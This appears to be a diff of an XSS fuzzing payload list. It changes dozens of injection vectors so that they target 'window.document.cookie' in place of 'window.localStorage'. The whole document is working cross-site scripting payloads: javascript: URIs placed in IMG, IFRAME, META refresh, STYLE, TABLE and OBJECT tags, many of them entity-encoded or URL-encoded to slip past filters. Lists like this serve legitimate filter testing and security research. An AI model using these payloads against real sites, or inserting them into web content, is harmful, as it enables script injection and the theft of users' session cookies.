+&lt;BGSOUND SRC=&quot;javascript:alert(&apos;window.document.cookie&apos;);&quot;&gt;
+&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;window.document.cookie&apos;);&quot;&gt;
+&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;window.document.cookie&apos;))&quot;&gt;
+&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;window.document.cookie&apos;))&quot;&gt;
+&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;window.document.cookie&apos;);&quot;&gt;&lt;/FRAMESET&gt;
+&lt;IFRAME SRC=&quot;javascript:alert(&apos;window.document.cookie&apos;);&quot;&gt;&lt;/IFRAME&gt;
+&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;window.document.cookie&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;javascript:alert(&apos;window.document.cookie&apos;);&quot;&gt;
+&lt;IMG SRC=javascript:alert(&apos;window.document.cookie&apos;)&gt;
+&lt;IMG DYNSRC=&quot;javascript:alert(&apos;window.document.cookie&apos;);&quot;&gt;
+&lt;IMG LOWSRC=&quot;javascript:alert(&apos;window.document.cookie&apos;);&quot;&gt;
+&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;window.document.cookie&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;window.document.cookie
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;window.document.cookie&apos;);&quot;&gt;
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;window.document.cookie&apos;);&quot;&gt;
+&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;window.document.cookie&apos;)&gt;&lt;/OBJECT&gt;
+&lt;STYLE&gt;.window.document.cookie{background-image:url(&quot;javascript:alert(&apos;window.document.cookie&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=window.document.cookie&gt;&lt;/A&gt;
+&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;window.document.cookie&apos;)&quot;)}&lt;/STYLE&gt;
+&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;window.document.cookie&apos;);&quot;&gt;
+&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;window.document.cookie&apos;)&quot;&gt;&lt;/TABLE&gt;
+&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;window.document.cookie&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;
+&lt;IMG SRC=javascript:alert(&amp;quot;window.document.cookie&amp;quot;)&gt;
+&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;window.document.cookie&apos;&quot;)`&gt;
 &lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
-&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;window.localStorage&apos;);&quot;&gt;
-&lt;IMG SRC=&quot;javascript:alert(&apos;window.localStorage&apos;)&quot;
-<;BASE HREF=";javascript:alert(';window.localStorage';);//";>;
-<;BGSOUND SRC=";javascript:alert(';window.localStorage';);";>;
-<;BODY BACKGROUND=";javascript:alert(';window.localStorage';);";>;
-<;DIV STYLE=";background-image: url(javascript:alert(';window.localStorage';))";>;
-<;DIV STYLE=";background-image: url(&;#1;javascript:alert(';window.localStorage';))";>;
-<;FRAMESET>;<;FRAME SRC=";javascript:alert(';window.localStorage';);";>;<;/FRAMESET>;
-<;IFRAME SRC=";javascript:alert(';window.localStorage';);";>;<;/IFRAME>;
-<;INPUT TYPE=";IMAGE"; SRC=";javascript:alert(';window.localStorage';);";>;
-<;IMG SRC=";javascript:alert(';window.localStorage';);";>;
-<;IMG SRC=javascript:alert(';window.localStorage';)>;
-<;IMG DYNSRC=";javascript:alert(';window.localStorage';);";>;
-<;IMG LOWSRC=";javascript:alert(';window.localStorage';);";>;
-<;STYLE>;li {list-style-image: url(";javascript:alert(&#39;window.localStorage&#39;)";);}<;/STYLE>;<;UL>;<;LI>;window.localStorage
-<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(';window.localStorage';);";>;
-<;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:alert(';window.localStorage';);";>;
-<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';window.localStorage';)>;<;/OBJECT>;
-<;STYLE>;.window.localStorage{background-image:url(";javascript:alert(';window.localStorage';)";);}<;/STYLE>;<;A CLASS=window.localStorage>;<;/A>;
-<;STYLE type=";text/css";>;BODY{background:url(";javascript:alert(';window.localStorage';)";)}<;/STYLE>;
-<;LINK REL=";stylesheet"; HREF=";javascript:alert(';window.localStorage';);";>;
-<;TABLE BACKGROUND=";javascript:alert(';window.localStorage';)";>;<;/TABLE>;
-<;TABLE>;<;TD BACKGROUND=";javascript:alert(';window.localStorage';)";>;<;/TD>;<;/TABLE>;
-<;IMG SRC=javascript:alert(&;quot;window.localStorage&;quot;)>;
-<;IMG SRC=`javascript:alert(";RSnake says, ';window.localStorage';";)`>;
+&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;window.document.cookie&apos;);&quot;&gt;
+&lt;IMG SRC=&quot;javascript:alert(&apos;window.document.cookie&apos;)&quot;
+<;BASE HREF=";javascript:alert(';window.document.cookie';);//";>;
+<;BGSOUND SRC=";javascript:alert(';window.document.cookie';);";>;
+<;BODY BACKGROUND=";javascript:alert(';window.document.cookie';);";>;
+<;DIV STYLE=";background-image: url(javascript:alert(';window.document.cookie';))";>;
+<;DIV STYLE=";background-image: url(&;#1;javascript:alert(';window.document.cookie';))";>;
+<;FRAMESET>;<;FRAME SRC=";javascript:alert(';window.document.cookie';);";>;<;/FRAMESET>;
+<;IFRAME SRC=";javascript:alert(';window.document.cookie';);";>;<;/IFRAME>;
+<;INPUT TYPE=";IMAGE"; SRC=";javascript:alert(';window.document.cookie';);";>;
+<;IMG SRC=";javascript:alert(';window.document.cookie';);";>;
+<;IMG SRC=javascript:alert(';window.document.cookie';)>;
+<;IMG DYNSRC=";javascript:alert(';window.document.cookie';);";>;
+<;IMG LOWSRC=";javascript:alert(';window.document.cookie';);";>;
+<;STYLE>;li {list-style-image: url(";javascript:alert(&#39;window.document.cookie&#39;)";);}<;/STYLE>;<;UL>;<;LI>;window.document.cookie
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(';window.document.cookie';);";>;
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:alert(';window.document.cookie';);";>;
+<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';window.document.cookie';)>;<;/OBJECT>;
+<;STYLE>;.window.document.cookie{background-image:url(";javascript:alert(';window.document.cookie';)";);}<;/STYLE>;<;A CLASS=window.document.cookie>;<;/A>;
+<;STYLE type=";text/css";>;BODY{background:url(";javascript:alert(';window.document.cookie';)";)}<;/STYLE>;
+<;LINK REL=";stylesheet"; HREF=";javascript:alert(';window.document.cookie';);";>;
+<;TABLE BACKGROUND=";javascript:alert(';window.document.cookie';)";>;<;/TABLE>;
+<;TABLE>;<;TD BACKGROUND=";javascript:alert(';window.document.cookie';)";>;<;/TD>;<;/TABLE>;
+<;IMG SRC=javascript:alert(&;quot;window.document.cookie&;quot;)>;
+<;IMG SRC=`javascript:alert(";RSnake says, ';window.document.cookie';";)`>;
 <;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>;
-<;IMG SRC="; &;#14;  javascript:alert(';window.localStorage';);";>;
-<;IMG SRC=";javascript:alert(';window.localStorage';)";
-"><STYLE>@import"javascript:alert('window.localStorage')";</STYLE>
->%22%27><img%20src%3d%22javascript:alert(%27%20window.localStorage%27)%22>
-<IMG SRC="javascript:alert('window.localStorage');">
-<IMG SRC=javascript:alert('window.localStorage')>
-<IMG SRC="javascript:alert('window.localStorage');">
-<IMG SRC=javascript:alert(&quot;window.localStorage&quot;)>
-<IMG SRC=javascript:alert('window.localStorage')>       
+<;IMG SRC="; &;#14;  javascript:alert(';window.document.cookie';);";>;
+<;IMG SRC=";javascript:alert(';window.document.cookie';)";
+"><STYLE>@import"javascript:alert('window.document.cookie')";</STYLE>
+>%22%27><img%20src%3d%22javascript:alert(%27%20window.document.cookie%27)%22>
+<IMG SRC="javascript:alert('window.document.cookie');">
+<IMG SRC=javascript:alert('window.document.cookie')>
+<IMG SRC="javascript:alert('window.document.cookie');">
+<IMG SRC=javascript:alert(&quot;window.document.cookie&quot;)>
+<IMG SRC=javascript:alert('window.document.cookie')>       
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
-<BODY BACKGROUND="javascript:alert('window.localStorage')">
-<INPUT TYPE="IMAGE" SRC="javascript:alert('window.localStorage');">
-<IMG SRC="javascript:alert('window.localStorage')"
+<BODY BACKGROUND="javascript:alert('window.document.cookie')">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('window.document.cookie');">
+<IMG SRC="javascript:alert('window.document.cookie')"
 <marquee onstart='javascript:alert('1');'>=(◕_◕)=
 
 
